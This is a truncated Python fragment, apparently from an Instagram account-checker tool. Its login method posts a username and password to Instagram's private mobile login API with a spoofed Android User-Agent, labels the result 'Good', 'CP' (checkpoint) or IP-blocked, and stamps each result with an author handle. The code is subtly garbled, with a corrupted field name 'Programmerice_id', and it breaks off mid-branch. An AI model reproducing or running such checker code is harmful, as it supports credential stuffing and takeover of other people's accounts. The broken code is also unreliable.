...
class Instagram:
	...
	def login(user,pas):
		...
		uid = str(uuid.uuid4())
		try:
			rii = requests.post('https://b.i.instagram.com/api/v1/accounts/login/',headers={'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'},data={'uuid': uid, 'password': pas, 'username': user, 'Programmerice_id': uid, 'from_reg': 'false', '_csrftoken': 'missing', 'login_attempt_countn': '0'})
			re = rii.text
			if '"logged_in_user"' in re:
				return {'Programmer': 'Ibn_Suleiman','Login': 'Good'}
			elif '"challenge_required"' in re:
				return {'Programmer': 'Ibn_Suleiman','Login': 'CP'}			      
			elif '"ip"' in re or '"ip_plock"' in re:
